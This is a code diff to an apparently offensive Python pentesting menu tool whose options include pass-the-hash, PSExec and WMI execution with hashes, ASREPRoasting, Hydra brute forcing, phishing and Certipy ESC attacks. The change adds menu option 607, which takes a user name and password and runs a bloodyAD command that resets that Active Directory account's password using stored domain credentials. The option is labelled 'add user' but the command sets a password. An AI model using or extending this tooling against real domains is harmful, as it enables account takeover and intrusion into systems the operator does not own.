@@ -791,7 +791,7 @@ def options():
    print('\u2551' + "(05) Re/Set WEBSITE URL (15) Re/Set SERVERS   (35) DComExec (45) Enum EndPoints (55) ASREPRoasting (65) Disp Ticket (75) ExplCreator (85) GenListPass (95 ) Netcat   (235) Light Serv Scan (345) Edit Resolv.conf (445) Enum Sub-DOM (604) Crack-Map-Exec (704) Certipy ESC4                        " + '\u2551')
    print('\u2551' + "(06) Re/Set USER   NAME (16) Re/Set REV SHELL (36) PS  Exec (46) Rpc ClientServ (56) TARGDRoasting (66) PSExec HASH (76) Dir Listing (86) NTDSDECRYPT (96 ) MSSQL    (236) Heavy Serv Scan (346) Edit ProxyChains (446) EnumVirtHOST (605) Domain    Dump (705) Certipy ESC5                        " + '\u2551')
    print('\u2551' + "(07) Re/Set PASS   WORD (17) Re/Set SERV TIME (37) SMB Exec (47) Smb ClientServ (57) Pass the HASH (67) SmbExecHASH (77) SNMP Walker (87) Hail! HYDRA (97 ) MySQL    (237) WordPress  Scan (347) Edit  Kerb5.conf (447) FUZZ Sub-DOM (606) Blood    Hound (706) Certipy ESC6 (996) MANUAL CHISEL64  " + '\u2551')
-   print('\u2551' + "(08) Re/Set NTLM   HASH (28) Re/Set Community (38) WMI Exec (48) Smb Map SHARES (58) OverPass HASH (68) WmiExecHASH (78) ManPhishCod (88) RedisClient (98 ) WinRm    (238) WP Plugin  Scan (348) ADD AD Usernames (448) HTTP GitDump (607)                (707) Certipy ESC7 (997) AUTO   CHISEL64  " + '\u2551')
+   print('\u2551' + "(08) Re/Set NTLM   HASH (28) Re/Set Community (38) WMI Exec (48) Smb Map SHARES (58) OverPass HASH (68) WmiExecHASH (78) ManPhishCod (88) RedisClient (98 ) WinRm    (238) WP Plugin  Scan (348) ADD AD Usernames (448) HTTP GitDump (607) BloodyADd User (707) Certipy ESC7 (997) AUTO   CHISEL64  " + '\u2551')
    print('\u2551' + "(09) Re/Set TICKET NAME (29) Re/Set FUZZRIDER (39) NFS List (49) Smb Dump Files (59) PASSWORD2HASH (69)             (79) AutoPhisher (89) Remote Sync (99 ) RemDesk  (239) Nuclei  Scanner (349) LFI OS   Checker (449)              (608)                (708) Certipy ESC8 (998) SSH PortForward  " + '\u2551')
    print('\u2551' + "(10) Re/Set DOMAIN NAME (30) Re/Set WORD LIST (40) NFSMount (50) Smb MountSHARE (60)               (70)             (80) MSF Console (90) Rsync Dumps (100) RDPBrute (240)                 (350) LFI     Wordlist (450)              (609) BloodHound GUI (709) Certipy ESC9 (999)", end= ' ')
    if proxyChains == 1:
@@ -4565,11 +4565,14 @@ while True:
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
 # Details : Menu option selected - 
-# Old : Menu option selected - Start Neo4j Console
+# Old : Menu option selected - Blood-AD add user.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '607':
+      AD1 = input("[?] Please enter new users name: ")
+      AD2 = input("[?] Please enter new users password: ")
+      localCOM("bloodyAD --host " + TIP.rstrip("") + " -d " + DOM.rstrip("") + " -u " + USR.rstrip("") + "  -p :" + PAS.rstrip("") + " set password " + AD1.rstrip("") + " " + AD2.rstrip(""))
       prompt()
 
 #      print(colored("[*] Starting Neo4j Console...", colour3))         
